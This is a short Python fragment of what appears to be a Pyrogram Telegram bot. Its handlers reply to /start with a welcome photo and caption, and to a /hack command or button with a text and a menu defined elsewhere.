START_PIC = "https://telegra.ph//file/a9a90059ae47fa840b0b3.jpg"

@app.on_message(filters.command("start") & filters.private)
async def _start(_, message):
    user = message.from_user.mention
    bot = (await _.get_me()).mention 
    await message.reply_photo(
       photo = START_PIC,
       caption = PM_TEXT.format(user, bot),
       reply_markup = PM_BUTTON) 


@app.on_message(filters.command("hack") & filters.private)
async def _hack(_, message):
    await message.reply_text(HACK_TEXT,
              reply_markup = HACK_MODS) 


@app.on_callback_query(filters.regex("hack_btn"))
async def heck_callback(bot : app, query : CallbackQuery):
    await query.message.delete()
    await query.message.reply_text(HACK_TEXT,
              reply_markup = HACK_MODS)


# End of merged file
